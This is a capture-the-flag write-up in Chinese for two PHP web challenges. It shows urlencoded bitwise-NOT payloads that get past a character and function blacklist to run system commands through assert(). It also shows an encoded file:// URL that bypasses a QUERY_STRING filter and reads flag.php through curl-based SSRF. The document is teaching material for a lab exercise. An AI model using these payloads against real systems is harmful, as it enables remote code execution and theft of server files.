# 第五空间wp

## WEB

### Hate-PHP

```php
<?php
error_reporting(0);
if(!isset($_GET['code'])){
    highlight_file(__FILE__);
}else{
    $code = $_GET['code'];
    if (preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i',$code)) {
        die('You are too good for me');
    }
    $blacklist = get_defined_functions()['internal'];
    foreach ($blacklist as $blackitem) {
        if (preg_match ('/' . $blackitem . '/im', $code)) {
            die('You deserve better');
        }
    }
    assert($code);
}
```

可以看到通过`preg_match`禁用了各种字符，通过`get_defined_functions()['internal']`禁用了几乎所有的内置函数

这时我们可以利用php7函数执行的新特性进行解答，这里贴上p牛写的博客

[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

即取反后利用urlencode执行即可

先`system('ls')`看下目录

```text
?code=(~%8C%86%8C%8B%9A%92)(~%93%8C)    =>   flag.php index.php
```

`system('cat flag.php')`读取文件

```text
?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)
```

```php
<?php
$flag = 'flag{ecee9b5f24f8aede87cdda995fed079c}';
```

### do you know

```php
<?php
highlight_file(__FILE__);
#本题无法访问外网
#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
#there is xxe.php
$poc=$_SERVER['QUERY_STRING'];
if(preg_match("/log|flag|hist|dict|etc|file|write/i" ,$poc)){
                die("no hacker");
        }
$ids=explode('&',$poc);
$a_key=explode('=',$ids[0])[0];
$b_key=explode('=',$ids[1])[0];
$a_value=explode('=',$ids[0])[1];
$b_value=explode('=',$ids[1])[1];

if(!$a_key||!$b_key||!$a_value||!$b_value)
{
        die('我什么都没有~');
}
if($a_key==$b_key)
{
    die("trick");
}

if($a_value!==$b_value)
{
        if(count($_GET)!=1)
        {
                die('be it so');
        }
}
foreach($_GET as $key=>$value)
{
        $url=$value;
}

$ch = curl_init();
    if ($type != 'file') {
        #add_debug_log($param, 'post_data');
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    } else {
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
    }

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    // 设置header
    if ($type == 'file') {
        $header[] = "content-type: multipart/form-data; charset=UTF-8";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    } elseif ($type == 'xml') {
        curl_setopt($ch, CURLOPT_HEADER, false);
    } elseif ($has_json) {
        $header[] = "content-type: application/json; charset=UTF-8";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }

    // curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
    // dump($param);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
    // 要求结果为字符串且输出到屏幕上
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 使用证书：cert 与 key 分别属于两个.pem文件


    $res = curl_exec($ch);
    var_dump($res);
```

- 解法1

看了颖奇大佬的博客，了解到了`QUERY_STRING`的独特之处

对于QUERY_STRING

```text
原文链接 http://blog.sina.com.cn/s/blog_686999de0100jgda.html

1，http://localhost/aaa/ (打开aaa中的index.php)
结果：
$_SERVER['QUERY_STRING'] = "";
$_SERVER['REQUEST_URI'] = "/aaa/";
$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";
$_SERVER['PHP_SELF'] = "/aaa/index.php";

2，http://localhost/aaa/?p=222 (附带查询)
结果：
$_SERVER['QUERY_STRING'] = "p=222";
$_SERVER['REQUEST_URI'] = "/aaa/?p=222";
$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";
$_SERVER['PHP_SELF'] = "/aaa/index.php";

3，http://localhost/aaa/index.php?p=222&q=333
结果：
$_SERVER['QUERY_STRING'] = "p=222&q=333";
$_SERVER['REQUEST_URI'] = "/aaa/index.php?p=222&q=333";
$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";
$_SERVER['PHP_SELF'] = "/aaa/index.php";

由实例可知：
$_SERVER["QUERY_STRING"] 获取查询 语句，实例中可知，获取的是?后面的值
$_SERVER["REQUEST_URI"] 获取 http://localhost 后面的值，包括/
$_SERVER["SCRIPT_NAME"] 获取当前脚本的路径，如：index.php
$_SERVER["PHP_SELF"] 当前正在执行脚本的文件名
```

QUERY_STRING不会自动进行urldecode，$_GET[]会

因此直接用urlencode绕过即可，用`file:///var/www/html/flag.php`读文件

```text
?a=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&b=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70
```
